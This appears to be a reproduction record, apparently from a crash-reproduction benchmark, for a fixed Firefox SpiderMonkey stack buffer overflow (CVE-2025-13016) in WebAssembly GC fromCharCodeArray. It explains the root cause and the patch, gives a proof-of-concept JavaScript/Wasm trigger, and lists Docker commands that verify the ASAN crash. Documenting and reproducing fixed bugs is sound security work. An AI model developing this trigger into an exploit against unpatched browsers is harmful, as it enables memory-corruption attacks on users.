# Bugzilla 1992130 / CVE-2025-13016

**Title:** Stack buffer overflow in WebAssembly GC `fromCharCodeArray` (type-mismatched `std::copy`)
**Severity:** sec-high (MFSA 2025-87, Firefox 145)
**Component:** SpiderMonkey — WebAssembly — `js/src/wasm/WasmGcObject.h`
**Fix commit:** `75ef3f79aae344c1d0398787cab666a6a73176c7` (Yury Delendik, 2025-10-15, r=rhunt, Phabricator D267284)
**Vulnerable revision:** `75ef3f79aae344c1d0398787cab666a6a73176c7~1`
**Reporter:** Igor Morgenstern (Aisle).

## Summary

`StableWasmArrayObjectElements::StableWasmArrayObjectElements()` copied
WebAssembly GC array inline storage into a freshly-allocated backing
vector (`ownElements_`) by invoking

```cpp
std::copy(array->inlineStorage(),
          array->inlineStorage() + array->numElements_ * sizeof(T),
          ownElements_->begin());
```

The source iterator is `uint8_t*` (byte-typed), while the destination is
`T*` (e.g., `uint16_t*` for `(array (mut i16))`). `std::copy` deduces
the iteration count from the source iterator range — `numElements *
sizeof(T)` bytes — and performs *that many* writes of the destination
type. For an i16 array that produces `numElements * sizeof(T)` writes
of `uint16_t` (4 × numElements bytes) into an `ownElements_` stack
buffer sized for `numElements` elements (2 × numElements bytes) — a
classic stack-buffer-overflow.

## Fix

```cpp
// after 75ef3f79 — typed access that respects inline layout
std::copy(array->inlineArrayElements<T>(),
          array->inlineArrayElements<T>() + array->numElements_,
          ownElements_->begin());
```

`inlineArrayElements<T>()` returns a typed `T*` so `std::copy`'s
iterator-category deduction picks the correct element count. Only
`numElements` typed writes happen.

## Trigger (`poc.js`)

Synthesized from the published jit-test for the predecessor bug
1956768 — the same `fromCharCodeArray` entry point that calls
`StableWasmArrayObjectElements`:

```js
let testModule = `(module
  (type $aI16 (array (mut i16)))
  (func $fcca (import "wasm:js-string" "fromCharCodeArray")
    (param (ref null $aI16) i32 i32) (result (ref extern)))
  (func (export "test") (param i32) (result externref)
    local.get 0
    (array.new_default $aI16)
    i32.const 0
    local.get 0
    call $fcca))`;
let m = new WebAssembly.Module(wasmTextToBinary(testModule), {builtins:['js-string']});
let inst = new WebAssembly.Instance(m, {});
for (let sz of [1, 2, 4, 8, 16, 32, 64, 100, 256, 1000, 4096]) {
  for (let k = 0; k < 10; k++) {
    try { oomTest(() => inst.exports.test(sz)); } catch(e) {}
  }
}
```

`oomTest` drives `StableWasmArrayObjectElements` construction under
controlled OOM; at least one size reliably picks a stack layout that
ASAN flags as a stack-buffer-overflow.

## Expected crash

ASAN **stack-buffer-overflow WRITE** at
`js::StableWasmArrayObjectElements<unsigned short>::StableWasmArrayObjectElements`
in `js/src/wasm/WasmGcObject.h:510`, reached via
`js::wasm::Instance::stringFromCharCodeArray`.

## Verification

```sh
docker build -t hwiwonlee/sm.x86_64:1992130 spidermonkey/1992130
bash spidermonkey/crash_check.sh 1992130
```

Expected: `CONFIMRED: ASAN_CRASH`.
